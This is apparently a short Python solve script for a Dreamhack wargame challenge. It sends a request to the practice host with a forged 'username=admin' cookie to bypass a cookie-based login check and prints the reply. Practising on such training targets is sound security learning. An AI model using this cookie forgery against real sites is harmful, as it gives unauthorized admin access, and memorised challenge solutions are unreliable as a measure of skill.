import requests

port = 14144
URL_index = f"http://host1.dreamhack.games:{port}"
cookies = {"username": "admin"}
response = requests.get(URL_index, cookies=cookies)
print(response.status_code)
print(response.text)
